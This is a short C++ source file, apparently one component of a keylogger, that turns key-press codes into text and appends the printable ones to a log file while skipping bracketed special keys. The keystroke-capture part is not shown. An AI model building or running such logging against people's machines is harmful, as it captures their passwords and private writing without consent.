#include "WordNormalFileSaver.h"
#include <fstream>
#include "KeyRepresentation.h"


WordNormalFileSaver::WordNormalFileSaver(const std::string& normalFile)
    : FileSaver(normalFile) {
}

void WordNormalFileSaver::SaveNormal(const int keyPressNumber) {
    std::ofstream logs_word;
    logs_word.open(NameFile_infotxt, std::ios_base::app);

    std::string key_test = GetKeyRepresentation(keyPressNumber);
    if (key_test.find('[') == std::string::npos && key_test.find(']') == std::string::npos) {
        logs_word << key_test;
    }
    logs_word.close();
}
